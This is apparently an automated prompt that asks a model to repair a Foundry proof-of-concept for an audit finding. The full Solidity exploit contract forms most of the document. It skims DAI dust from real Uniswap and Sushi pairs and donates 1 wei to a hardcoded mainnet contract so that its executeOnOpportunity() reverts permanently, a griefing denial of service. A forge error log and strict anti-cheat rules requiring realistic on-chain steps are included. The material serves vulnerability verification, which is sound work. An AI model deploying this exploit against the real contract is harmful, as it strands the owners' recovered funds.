You are fixing a failing Foundry PoC for finding F-005.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: A single wei of DAI can brick every future recovery attempt
- claim: `executeOnOpportunity()` unconditionally tries to liquidate any positive DAI balance. Because Uniswap V2 rounds sufficiently tiny swaps down to zero output, an attacker can transfer 1 wei of DAI to the contract and force `_swapTokenToEth(DAI)` to revert when the router attempts to swap that balance, causing the entire `executeOnOpportunity()` transaction to revert on every run until additional DAI is donated.
- impact: Any external account can cheaply and permissionlessly deny service to the recovery flow, blocking liquidation of legitimately recovered WBTC/USDC/USDT/WETH proceeds as well. Since the contract has no token rescue or dust-clearing path, the griefing balance can persist indefinitely and strand future recoveries.
- exploit_paths: ["An attacker transfers 1 wei of DAI to `FlawVerifier`", "A caller invokes `executeOnOpportunity()`", "`_swapTokenToEth(DAI)` observes `bal > 0` and calls the Uniswap V2 router with `amountIn = 1`", "The swap computes zero ETH output for that tiny amount and reverts, bubbling the failure up", "The whole transaction reverts, so no bounty sweep or liquidation can complete until more DAI is added"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20 {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IUniswapV2Factory {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Pair {
    function skim(address to) external;
}

interface IOpportunityTarget {
    function executeOnOpportunity() external;
}

contract FlawVerifier {
    address public constant TARGET = 0xf3F84cE038442aE4c4dCB6A8Ca8baCd7F28c9bDe;

    address public constant WBTC = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant UNI_FACTORY = 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f;
    address public constant SUSHI_FACTORY = 0xC0AEe478e3658e2610c5F7A4A2E1777cE9e4f2Ac;

    uint256 private _profitAmount;
    bool private _hypothesisValidated;

    error NoDonationDust();
    error DonationFailed();
    error HypothesisRefuted();
    error TargetDidNotRetainDust();

    constructor() {}

    function executeOnOpportunity() external {
        _profitAmount = 0;
        _hypothesisValidated = false;

        // The finding is a griefing-only path. This PoC does not assume seeded capital,
        // so it first tries the smallest realistic public action that can source the 1 wei
        // donation without changing the exploit causality: skimming already-stranded DAI
        // dust from existing Uniswap V2 / Sushi pairs.
        _collectDonationDust();

        uint256 localDai = IERC20(DAI).balanceOf(address(this));
        if (localDai == 0) {
            // Concrete infeasibility reason: at this fork state there was no free DAI dust
            // available to fund the required 1 wei donation, and this finding does not create
            // value that could repay temporary capital.
            revert NoDonationDust();
        }

        uint256 targetDaiBefore = IERC20(DAI).balanceOf(TARGET);
        if (!_safeTransfer(DAI, TARGET, 1)) {
            revert DonationFailed();
        }

        uint256 targetDaiAfterDonation = IERC20(DAI).balanceOf(TARGET);
        if (targetDaiAfterDonation < targetDaiBefore + 1) {
            revert DonationFailed();
        }

        // Path-strict validation:
        // 1) attacker transfers 1 wei of DAI to the target
        // 2) a caller invokes the target's executeOnOpportunity()
        // 3) the call must revert once the target attempts to liquidate that positive DAI balance
        (bool ok,) = TARGET.call(abi.encodeWithSelector(IOpportunityTarget.executeOnOpportunity.selector));
        if (ok) {
            revert HypothesisRefuted();
        }

        if (IERC20(DAI).balanceOf(TARGET) < targetDaiBefore + 1) {
            revert TargetDidNotRetainDust();
        }

        _hypothesisValidated = true;

        uint256 leftoverDai = IERC20(DAI).balanceOf(address(this));
        if (leftoverDai != 0) {
            _profitAmount = leftoverDai;
        }
    }

    function profitToken() external view returns (address) {
        return _profitAmount == 0 ? address(0) : DAI;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function hypothesisValidated() external view returns (bool) {
        return _hypothesisValidated;
    }

    function exploitPath() external pure returns (string memory) {
        return "skim existing DAI dust -> transfer 1 wei DAI to target -> call target.executeOnOpportunity() -> target reverts while trying to swap dust DAI";
    }

    function _collectDonationDust() internal {
        _skimIfPairExists(UNI_FACTORY, DAI, WETH);
        _skimIfPairExists(UNI_FACTORY, DAI, WBTC);
        _skimIfPairExists(UNI_FACTORY, DAI, USDC);
        _skimIfPairExists(UNI_FACTORY, DAI, USDT);

        _skimIfPairExists(SUSHI_FACTORY, DAI, WETH);
        _skimIfPairExists(SUSHI_FACTORY, DAI, WBTC);
        _skimIfPairExists(SUSHI_FACTORY, DAI, USDC);
        _skimIfPairExists(SUSHI_FACTORY, DAI, USDT);
    }

    function _skimIfPairExists(address factory, address tokenA, address tokenB) internal {
        address pair = IUniswapV2Factory(factory).getPair(tokenA, tokenB);
        if (pair == address(0)) {
            return;
        }

        (bool ok,) = pair.call(abi.encodeWithSelector(IUniswapV2Pair.skim.selector, address(this)));
        ok;
    }

    function _safeTransfer(address token, address to, uint256 amount) internal returns (bool) {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSignature("transfer(address,uint256)", to, amount));
        return ok && (data.length == 0 || abi.decode(data, (bool)));
    }

    receive() external payable {}
}

```

forge stdout (tail):
```

```

forge stderr (tail):
```
PATH_ALIGNMENT_ERROR: generated code misses too many path anchors: _swaptokentoeth(dai), bal > 0, amountin = 1; generated code does not cover paths indexes: 2
```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
